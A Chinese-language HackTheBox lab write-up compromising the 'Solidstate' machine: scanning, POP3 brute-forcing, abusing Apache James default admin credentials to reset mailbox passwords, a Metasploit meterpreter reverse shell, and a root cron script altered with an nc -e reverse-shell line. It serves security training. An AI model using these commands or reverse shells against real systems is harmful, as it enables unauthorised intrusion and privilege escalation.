---
title: "HackTheBox：Solidstate笔记"
slug: uigxel
date: 2020-05-07T18:01:39+08:00
source: yuque/penetration
---

10.10.10.51

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588846004234-2aecdd42-2279-4c38-96bb-c1c9072be69e.png)

# 信息收集
## Nmap
粗略扫描下，发现好几个端口,

```http
# nmap 10.10.10.51
Nmap scan report for 10.10.10.51
Host is up (1.0s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp


# 扫描全端口
## Nmap scan report for 10.10.10.51
Host is up (4.8s latency).
Not shown: 64192 closed ports, 1337 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  tcpwrapped
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  tcpwrapped
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.122 [10.10.16.122]), 
80/tcp   open  tcpwrapped
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  tcpwrapped
119/tcp  open  tcpwrapped
4555/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1134.71 seconds
```

首页发现一邮箱，试试爆破

```http
webadmin@solid-state-security.com
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588846328871-37dfec67-2c35-4702-a15c-5ca5dfae0a70.png)

尝试用`rockyou.txt`和`fasttrack.txt`爆破pop3，无果

```http
# hydra -l webadmin -P /usr/share/wordlists/rockyou.txt solid-state-security.com pop3 -v

Hydra v8.9.1 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-07 17:35:14
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking pop3://solid-state-security.com:110/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] CAPABILITY: -ERR[VERBOSE] using POP3 CLEAR LOGIN mechanism
[ERROR] Not an POP3 protocol or service shutdown: (null)
[ERROR] Not an POP3 protocol or service shutdown: (null)
[VERBOSE] Retrying connection for child 5
[VERBOSE] Retrying connection for child 9
[ERROR] Not an POP3 protocol or service shutdown: (null)
[ERROR] Not an POP3 protocol or service shutdown: (null)
[ERROR] Not an POP3 protocol or service shutdown: (null)
[ERROR] Not an POP3 protocol or service shutdown: (null)
[ERROR] Not an POP3 protocol or service shutdown: (null)
[ERROR] Not an POP3 protocol or service shutdown: (null)
[VERBOSE] Retrying connection for child 2
[VERBOSE] Retrying connection for child 7
[VERBOSE] Retrying connection for child 12
[VERBOSE] Retrying connection for child 13
[STATUS] 502.00 tries/min, 502 tries in 00:01h, 14343899 to do in 476:14h, 16 active
[STATUS] 651.67 tries/min, 1955 tries in 00:03h, 14342446 to do in 366:49h, 16 active
^[[A^[[B^[[C^[[C^C[ERROR] Received signal 2, going down ...
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.

# # hydra -l webadmin -P /usr/share/wordlists/fasttrack.txt solid-state-security.com pop3 -v


```

后面全端口的扫描结果也出来了，发现4555端口，并且搜索，发现一个rce

```http
# searchsploit  james 2.3
-------------------------------- ----------------------------------------
 Exploit Title                  |  Path
                                | (/usr/share/exploitdb/)
-------------------------------- ----------------------------------------
Apache James Server 2.3.2 - 
Remote Command Execution        | exploits/linux/remote/35513.py
----------------------------------------------------------- ------------
```

默认密码是root-root，并没有反弹shell

~~直接nc连进去，~~尝试了半个小时，发现必须要用telnet才能登录（才能互动）

## JAMES Admin Tool
```markdown
# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands

# help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection


# listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin

```

在4445端口把上面几个用户的密码改了之后, 登录上pop3

# 拿user权限
## john的邮箱
```markdown
# root@localhost:~/HTB/solidstate# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
# user john
+OK
# pass john
+OK Welcome john
# list
+OK 1 743
1 743
.
# retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. 
Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.

```

大意就是发了一个默认密码给一个叫`mindy`的人

## mindy的邮箱
```markdown
# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
# user mindy
+OK
# pass mindy
+OK Welcome mindy
# list
+OK 2 1945
1 1109
2 836
.
# retr
-ERR Usage: RETR [mail number]
# retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
# retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

```

整挺好——直接得到user权限





```markdown
msf5 exploit(linux/smtp/apache_james_exec) > handler -H 10.10.16.122 -P 4443 -p linux/x86/meterpreter/reverse_tcp
msf5 exploit(linux/smtp/apache_james_exec) > exploit -j
[*] Exploit running as background job 6.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.122:4444 
msf5 exploit(linux/smtp/apache_james_exec) > [*] Sending stage (989416 bytes) to 10.10.10.51
[*] 10.10.10.51:25 - Command Stager progress - 100.00% done (773/773 bytes)
[*] 10.10.10.51:25 - Waiting for cron to execute payload...
[*] Meterpreter session 3 opened (10.10.16.122:4444 -> 10.10.10.51:42336) at 2020-05-07 20:54:27 +0000
msf5 exploit(linux/smtp/apache_james_exec) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  3         meterpreter x86/linux               10.10.16.122:4444 -> 10.10.10.51:42336 (10.10.10.51)

msf5 exploit(linux/smtp/apache_james_exec) > sessions 3
[*] Starting interaction with 3...


meterpreter > shell
Process 1962 created.
Channel 1 created.
whoami
	mindy
id
	uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```



# 走歪的路
ssh登录上去之后，用linpeas.sh做本机信息收集，发现在631端口有个web服务

```markdown

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                 
```

curl看了下，感觉有戏,`cups 2.2.1`

```markdown
# curl 127.0.0.1:631
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2362 <!DOCTYPE HTML>     0      0      0 --:--:-- --:--:-- --:--:--     0
<html>
  <head>
...
    <title>Home - CUPS 2.2.1</title>
  </head>
  <body>
    <div class="header">
      <ul>
	<li><a href="http://www.cups.org/" target="_blank">CUPS.org</a></li>
	<li><a class="active" href="/">Home</a></li>
	<li><a href="/admin">Administration</a></li>
	<li><a href="/classes/">Classes</a></li>
	<li><a href="/help/">Help</a></li>
	<li><a href="/jobs/">Jobs</a></li>
	<li><a href="/printers/">Printers</a></li>
      </ul>
    </div>
    <div class="body">
      <div class="row">
	<h1>CUPS 2.2.1</h1>
	<p>CUPS is the standards-based, open source printing system developed by <a href="http://www.apple.com/">Apple Inc.</a> for macOS<sup>&reg;</sup> and other UNIX<sup>&reg;</sup>-like operating systems.</p>
      </div>
      <div class="row">
	<div class="thirds">
	  <h2>CUPS for Users</h2>
	  <p><a href="help/overview.html">Overview of CUPS</a></p>
	  <p><a href="help/options.html">Command-Line Printing and Options</a></p>
	  <p><a href="http://www.cups.org/lists.php?LIST=cups">User Forum</a></p>
	</div>
	<div class="thirds">
	  <h2>CUPS for Administrators</h2>
	  <p><a href="admin">Adding Printers and Classes</a></p>
	  <p><a href="help/policies.html">Managing Operation Policies</a></p>
	  <p><a href="help/network.html">Using Network Printers</a></p>
	  <p><a href="help/man-cupsd.conf.html">cupsd.conf Reference</a></p>
	</div>
	<div class="thirds">
	  <h2>CUPS for Developers</h2>
	  <p><a href="help/api-overview.html">Introduction to CUPS Programming</a></p>
	  <p><a href="help/api-cups.html">CUPS API</a></p>
	  <p><a href="help/api-filter.html">Filter and Backend Programming</a></p>
	  <p><a href="help/api-httpipp.html">HTTP and IPP APIs</a></p>
	  <p><a href="http://www.cups.org/lists.php?LIST=cups-devel">Developer Forum</a></p>
	</div>
      </div>
    </div>
    <div class="footer">CUPS and the CUPS logo are trademarks of <a href="http://www.apple.com">Apple Inc.</a> Copyright &copy; 2007-2015 Apple Inc. All rights reserved.</div>
  </body>
</html>
 100  2362    0     0   531k      0 --:--:-- --:--:-- --:--:--  576k

```

于是想端口转发到本地来搞, 这里采用知道创宇的`rtcp`

端口转发

```markdown
在 A 服务器上运行：
	./rtcp.py c:localhost:631 c:10.10.16.122:630


在 B 服务器上运行：
	./rtcp.py l:630 l:631

    表示在本地监听了 10001 与 10002 两个端口，这样，这两个端口就可以互相传输数据了


```

转发失败，不知道什么原因。。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588926099446-06788da3-a721-4b8f-931a-11b8a777b8eb.png)

另一方面，用msf自带的提权模块也有一些结果

```markdown
msf5 post(multi/recon/local_exploit_suggester) > run

[+] 10.10.10.51 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.
[+] 10.10.10.51 - exploit/linux/local/pkexec: The service is running, but could not be validated.

```

尝试了，全部失败。



查了下walkthrough，网上的使用的是nc直接反弹shell，将`tmp.py`的内容改成反弹shell，等待定时任务执行直接提权。

# 提权
刚刚得到的是一个受限的shell-`rbash`。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588858957254-4923071a-4a96-4e4a-910a-45d5151f1723.png)

```markdown
[+] Users with console
james:x:1000:1000:james:/home/james/:/bin/bash
mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
root:x:0:0:root:/root:/bin/bash
```

`rbash`中很多命令都没有，而且不能用`/`，因此使用linux/smtp/apache_james_exe模块来反弹完整的shell, 启动模块后，登录mindy用户的ssh即可收到shell

机器信息

```markdown
# uname -a
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
# cat /etc/issue
Debian GNU/Linux 9 \n \l

```

那么拿到meterpreter的shell之后，看到`/opt/tmp.py`文件是root权限，里面的内容可以加以利用

```markdown
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

```

追加一条反弹shell的代码

```markdown
echo "os.system('/bin/nc -e /bin/bash 10.10.16.122 99')" >> /opt/tmp.py
```

等待定时任务启动，nc监听即可得到root



# 反思总结
+ 实际上，当我拿到root权限后，我才发现，user用户下输入`crontab -l`是无法看到`root`用户的定时任务的。因此也就无怪乎linpeas.sh找到下面这个定时任务了。只能用`ps aux`配合上`ls -al`直觉推断一波了

```markdown
>> crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * python /opt/tmp.py


```

+ 一开始，在tmp.py里加入了反弹shel的代码后，直接执行后发现，反弹的并不是root权限。
+ 看来linux的权限是“谁运行就是谁的权限”
+ TRY HARDER

# reference
+ [SMTP、POP3、NNTP、FTP、HTTP服务器常用指令 - SSL之家](https://www.58ssl.com/ftp/1897.html)
+ [rbash - 一个受限的Bash Shell用实际示例说明](https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/)
+ [https://github.com/knownsec/rtcp](https://github.com/knownsec/rtcp)
+ [https://0x00sec.org/t/htb-solidstate-write-up/5129](https://0x00sec.org/t/htb-solidstate-write-up/5129)

